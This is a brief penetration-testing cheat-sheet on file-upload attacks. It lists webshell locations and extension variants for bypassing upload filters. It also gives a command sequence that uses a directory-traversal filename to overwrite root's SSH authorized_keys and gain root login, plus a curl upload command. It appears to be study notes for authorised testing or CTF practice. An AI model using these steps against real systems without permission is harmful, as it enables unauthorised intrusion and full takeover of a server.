## Executable Files 
- /usr/share/webshells/ (Has All Kinds of Webshells)

- https://book.hacktricks.xyz/pentesting-web/file-upload
#### Filter Bypass(For more refer the above URL)
(pHP, phps, phtml,php7)
Note : Use curl to check 

## Non Executable Files 
We cannot access directly so we need to leverage directory traversal
#### Overwriting Files (Weak Permission)
```
ssh-keygen
cat file.pub > authorized_keys
chmod a+rwx authorized_keys
chmod 600 id_rsa
#try to overwrite 
../../../../../../../root/.ssh/authorized_keys (upload file name should be like this in request)
ssh -i id_rsa user@ip
```
#### Upload File using Curl 
```
curl --user 'user:pass' -T file.exe url
```
